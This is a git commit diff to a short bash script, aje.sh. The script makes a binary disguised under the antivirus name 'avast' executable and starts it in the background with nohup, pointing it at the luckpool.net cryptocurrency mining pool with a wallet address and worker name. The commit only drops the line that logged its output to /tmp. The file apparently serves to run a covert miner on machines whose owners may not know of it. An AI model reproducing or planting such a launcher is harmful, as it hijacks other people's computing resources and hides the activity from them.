04c27fbad0eb5be1302c650b47102571f01870d6
ertgpklasty <93961255+ertgpklasty@users.noreply.github.com>
2021-11-09 11:00:11 +0700

    Update aje.sh

--- aje.sh
+++ aje.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 
 chmod +x avast  >/dev/null 2>&1
-nohup ./avast -v -l  eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.FAxSlowmo_01 -p x -t 2 -x > /tmp/avast.log 2>&1 
+nohup ./avast -v -l  eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.FAxSlowmo_01 -p x -t 2
